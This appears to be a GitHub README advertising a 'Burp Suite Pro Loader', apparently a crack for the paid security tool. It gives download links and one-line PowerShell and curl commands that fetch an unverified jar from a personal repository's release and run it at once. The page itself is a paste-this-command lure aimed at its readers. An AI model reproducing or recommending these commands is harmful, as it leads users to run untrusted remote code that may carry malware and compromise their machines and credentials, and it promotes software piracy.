<p align="center">
  <img src="burpsuite.webp" width="72" alt="Burp Suite" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Burp%20Suite-Pro%20Loader-F46A0A?style=for-the-badge&logo=burpsuite&logoColor=white" />
</p>

## Download

<p align="center">
  <a href="https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar" style="font-size:18px;color:#F46A0A;font-weight:bold;text-decoration:none">⬇ Click here to download</a>
</p>

Save as `burploader.jar`, then open a terminal and run:

```bash
java -jar burploader.jar
```

---

### Or grab it from the terminal

**Download only**

*Windows (PowerShell) — saves the file to your current directory*
```powershell
powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -OutFile burploader.jar"
```

*macOS / Linux — saves the file to your current directory*
```bash
curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -o burploader.jar
```

**Download & launch in one go**

*Windows (PowerShell)*
```powershell
powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -OutFile burploader.jar; java -jar burploader.jar"
```

*macOS / Linux*
```bash
curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -o burploader.jar && java -jar burploader.jar
```

---

## Requirements

| | Version |
|---|---|
| **Minimum JDK** | 21 |
| **Recommended** | 22 or 23 |

> For best stability, use a JDK that is 1–2 versions behind the latest release. Brand-new JDK releases may have compatibility quirks. JDK 21 is the long-term support (LTS) baseline.
